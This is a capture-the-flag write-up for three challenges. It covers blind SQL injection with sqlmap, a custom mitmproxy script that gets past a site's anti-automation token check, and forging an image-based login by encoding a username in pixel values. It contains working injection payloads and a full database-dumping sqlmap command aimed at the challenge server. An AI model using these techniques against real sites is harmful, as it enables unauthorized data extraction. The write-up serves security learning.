<h2>Web 50</h2>

<p>The PHP script appears to be running a SQL query of the form <code>SELECT FROM QUOTES WHERE quote LIKE '$search';</code></p>

<p>We can make this conditional true for all quotes by searching for <code>' or 1=1 or '</code>. We can check whether a SQL conditional evaluates to true by ANDing the conditional with another that should return true, e.g. <code>f' and 2=2 or 'foobar'='</code>. This allows us to extract one bit of information per query. We could write a binary search script to extract characters to read the database and, hopefully, the flag. </p>

<p>sqlmap is a great tool for automatic exploitation of SQL injection vulnerabilities. Let's throw sqlmap at the page for a few minutes to find all of the tables.</p>

<h2>Web 300</h2>

<p>This problem gives you an interface to check whether a user has registered <a href="http://backdoor.cognizance.org.in/problems/web300/status.php">here</a>. </p>

<p>If the username does not exist, the script returns <code>Please wait for a little while for this user to be validated</code>.
If it does exist, it returns <code>This user has been validated</code>.</p>

<p>As before, this script is vulnerable to blind SQL injection, and we receive a single bit of information from each query. </p>

<p>However, once we try to use sqlmap to exploit this automatically, we find that it cannot automatically detect and exploit the vulnerability. Rerunning sqlmap with the <code>-v 6</code> option will show full requests and responses. We see that the check.php script is now returning <code>No automated tools please :)</code>. How does it detect this?</p>

<p>For one, sqlmap usually sends a user-agent that identifies its requests as originating from sqlmap. However, copying the user-agent from Chrome does not solve the problem.</p>

<p>Taking a closer look at how a browser interacts with the problem, we find that the status.php page sets a cookie named <code>web_300_token</code> and the check.php page deletes this cookie. Each time the status.php page is loaded, we get a new <code>web_300_token</code>. The response headers of that page are clearly designed to prevent the browser from even thinking about caching anything from that page:</p>

<pre><code>Cache-Control:no-store, no-cache, must-revalidate, post-check=0, pre-check=0
Date:Sun, 23 Mar 2014 03:49:14 GMT
Expires:Thu, 19 Nov 1981 08:52:00 GMT
Pragma:no-cache
</code></pre>

<p>When you try to use the same <code>web_300_token</code> to send a second request to check.php, the server returns the <code>No automated tools please :)</code> message. So, we need to make sure that each request from sqlmap has a valid <code>web_300_token</code>, by making a request to status.php before each query.</p>

<p>Unfortunately, sqlmap can't do this out of the box. sqlmap <em>does</em> provide an <code>--eval</code> flag which executes Python code in a context containing the data that sqlmap is about to send, along with cookies. However, though it supports modification/addition of query data, changes to cookies are not reflected in the outgoing request. </p>

<p>Our first idea was a bit complicated. We put sqlmap behind an instance of mitmproxy with sticky cookies enabled on all requests. Then, in sqlmap's <code>--eval</code> parameter we passed the code:</p>

<pre><code>import urllib,time; urllib.urlopen('http://backdoor.cognizance.org.in/problems/web300/status.php',proxies={'http':'http://127.0.0.1:7222'});
</code></pre>

<p>The intention was that before each request, sqlmap should send a front-running request to status.php to prime the proxy with the <code>web_300_token</code> cookie. Then sqlmap would send the primary request, mitmproxy would tack on the cookie it received from status.php, and the query would be processed as if from a browser. </p>

<p>For some reason, this doesn't work as intended - mitmproxy mangles and combines cookies with expiration times on outgoing requests, and the check.php script rejects them. So, we had to go a step further and put together a libmproxy server to process the incoming and outgoing requests as we wanted:</p>

<pre><code>from libmproxy import controller, proxy
import os

class StickyMaster(controller.Master):
    def __init__(self, server):
        controller.Master.__init__(self, server)
        self.cookies=[]
    def run(self):
        try:
            return controller.Master.run(self)
        except KeyboardInterrupt:
            self.shutdown()

    def handle_request(self, msg):
        hid = (msg.host, msg.port)
        msg.headers["Cookie"] = ['; '.join(self.cookies)]
        msg.headers['User-Agent'] = ['Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.152 Safari/537.36']
        msg.headers['Connection'] = ['keep-alive']
        msg.reply()

    def handle_response(self, msg):
        hid = (msg.request.host, msg.request.port)
        if msg.headers["set-cookie"]:
            self.cookies = [x.split(';')[0] for x in msg.headers["set-cookie"] if 'delete' not in x]            
        print msg.headers, self.cookies
        msg.reply()
config = proxy.ProxyConfig()
server = proxy.ProxyServer(config, 7222)
m = StickyMaster(server)
m.run()
</code></pre>

<p>(We had further issues with the user-agent, so we also set the user-agent at the proxy to resolve them)</p>

<p>This nearly worked, but we noticed that it was rejecting most of our requests. We suspected that check.php was rejecting <code>web_300_tokens</code> which were too new. Experimentally, we determined that tokens newer than 2 seconds old were not valid, so to be safe, we inserted a 5-second sleep in our <code>--eval</code> code after priming the proxy.</p>

<p>Finally, sqlmap was able to work its magic and probe the database, albeit with requests spaced by around 5 seconds. Using a single proxy also meant that we could not use multiple sqlmap threads, although if desired we could have fixed that by including a complicated token queue in the proxy.</p>

</code></pre>

<p>Listing tables as before showed that there is a table named <code>the_elusive_flag</code> containing a single row.</p>

<pre><code>sqlmap -u http://backdoor.cognizance.org.in/problems/web300/check.php \
   --data="username=asdf" --proxy=http://127.0.0.1:7222 \
   --eval="import urllib,time; urllib.urlopen('http://backdoor.cognizance.org.in/problems/web300/status.php', \
           proxies={'http':'http://127.0.0.1:7222'}); time.sleep(5)" \
   --threads=1 -v 6 --dbms=mysql -T the_elusive_flag --dump -D blind_sqli_db
</code></pre>

<p>In the column named <code>this_column_has_the_flag</code> of the single row, we find, against all odds, a flag!</p>

<h2>Misc 250-2</h2>

<blockquote>
  <p>Username and password based login seemed a bit too monotonous. We developed an
indigenous image based login system.</p>

<p>The login service is available <a href="http://backdoor.cognizance.org.in/problems/misc250-2/login/">here</a>.</p>

<p>The image below can be used to login as the backdoor user. Unfortunately that
does not serve any purpose.
Login as the sdslabs user for a change.</p>
</blockquote>

<p><img src="backdoor.bmp" alt="backdoor" title="login for backdoor user" /></p>

<p>The first thing that comes to mind is changing the threshold of the image, but
that did not do anything. OCR also came to mind, but after spending some time 
in GIMP and unsuccessfully attempting to log in as sdslabs, it seemed very unlikely. 
So the next thing to be considered was the colors in the image.
I had a simple java program lying around that I had used some months ago which
printed the color of each pixel in hex. </p>

<p>Now the image was supposed to be completely black and white, but it had a lot of
other colors in it. This was because the text in the image was anti-aliased, 
so I painted over the text with #000000 and it still logged me in as the user backdoor. </p>

<p><img src="try.png" alt="backdoor2" title="this also logs you in as the user backdoor" /></p>

<p>But the image was still not all black, so I examined the pixels again and found
that they were all either #000000 or #010101. Hmmmm, it just might be a binary
message.</p>

<pre><code>[rray@gilgamesh backdoor]$ java PixelHex try.png | sort | uniq
ff000000  
ff010101
</code></pre>

<p>Then I opened up and examined all the pixels. All rows except for the top one in
the pixel grid were completely black, so the message was probably stored in the
top row. I made a new image with all the pixels changed to #123456 except for
the ones in the top row and successfully logged in using it.</p>

<p><img src="backdoor3.png" alt="backdoor3" title="this also logs you in" /></p>

<p>I continued changing everything but the first x pixels of the image to #123456
and it turned out the server would accept the image if the first 80 pixels were
unchanged. So I printed the first 80 pixels. </p>

<pre><code>[rray@gilgamesh backdoor]$ java EightyPixel backdoor.bmp 
    000000 010101 010101 000000 000000 000000 010101 000000
    000000 010101 010101 000000 000000 000000 000000 010101

    000000 000000 000000 000000 000000 000000 000000 000000
</code></pre>

<p>That looks like it could be a binary code, so I convert all the 010101 to 1 and
all the 000000 to 0 and get something like 
    01100010011000010110001101101011011001000110111101101111011100100000000000000000
which when converted to ascii yields "backdoor".</p>

<p>So then I just converted "sdslabs" to binary, converted the individual 0s to
the color #000000 and 1s to #010101 and inserted them in the image, making 
sure that the unused pixels from the first 80 pixels of the image were all set to #000000.</p>

<p>Then I submitted this image to log in as sdslabs and capture the flag.</p>

<p><img src="try3.png" alt="for_flag" title="sdslabs login image" /></p>
